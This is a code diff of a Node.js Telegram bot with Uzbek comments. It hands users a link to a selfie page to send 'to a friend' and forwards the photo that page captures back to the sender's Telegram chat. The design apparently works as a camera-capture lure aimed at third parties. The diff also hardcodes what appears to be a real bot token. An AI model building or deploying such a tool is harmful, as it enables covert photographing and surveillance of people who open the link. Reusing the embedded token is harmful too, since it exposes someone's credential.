@@ -2,7 +2,6 @@ import express from "express";
 import TelegramBot from "node-telegram-bot-api";
 import path from "path";
 import { fileURLToPath } from "url";
-import fs from "fs";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -10,12 +9,16 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Bot token
+// Telegram bot token
 const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
 
-const bot = new TelegramBot(TOKEN);
+// BASE_URL Render.com domeningiz
+const BASE_URL = "https://korish.onrender.com";
 
-// Foydalanuvchi tugmalari
+// Botni polling bilan ishga tushiramiz (lokal va Render.com uchun)
+const bot = new TelegramBot(TOKEN, { polling: true });
+
+// Tugmalar
 const buttons = {
   reply_markup: {
     keyboard: [
@@ -26,14 +29,14 @@ const buttons = {
   },
 };
 
-// JSON requestlarni qabul qilish
+// JSON limitni oshiramiz
 app.use(express.json({ limit: "5mb" }));
 app.use(express.urlencoded({ extended: true, limit: "5mb" }));
 
-// Static fayllar (index.html va boshqalar)
+// Static fayllar
 app.use(express.static(__dirname));
 
-// /start
+// /start komandasi
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(
@@ -49,8 +52,7 @@ bot.on("message", (msg) => {
   const text = msg.text;
 
   if (text === "📸 Rasm olish") {
-    const url = `https://korish.onrender.com/selfie/${chatId}`;
-
+    const url = `${BASE_URL}/selfie/${chatId}`;
     bot.sendMessage(
       chatId,
       `📷 Rasm olish uchun quyidagi havolani do‘stingizga yuboring:\n\n${url}`
@@ -94,13 +96,13 @@ app.get("/selfie/:chatId", (req, res) => {
 // Selfie API (rasmni Telegramga yuboradi)
 app.post("/api/selfie", (req, res) => {
   const chatId = req.body.chat_id;
-  const photoBase64 = req.body.photo; // Base64 string
-  if (!chatId || !photoBase64) return res.status(400).json({ ok: false });
+  const photoBase64 = req.body.photo;
 
-  // Base64ni Bufferga aylantiramiz
+  if (!chatId || !photoBase64)
+    return res.status(400).json({ ok: false, error: "chat_id yoki photo yo‘q" });
+
   const buffer = Buffer.from(photoBase64, "base64");
 
-  // Telegramga yuborish
   bot
     .sendPhoto(chatId, buffer, { caption: "Foydalanuvchi rasmi olindi ✅" })
     .then(() => res.json({ ok: true }))
@@ -109,7 +111,5 @@ app.post("/api/selfie", (req, res) => {
 
 // Server ishga tushishi
 app.listen(PORT, () => {
-  console.log(`✅ Server ishga tushdi. Port: ${PORT}`);
+  console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
 });
-
-
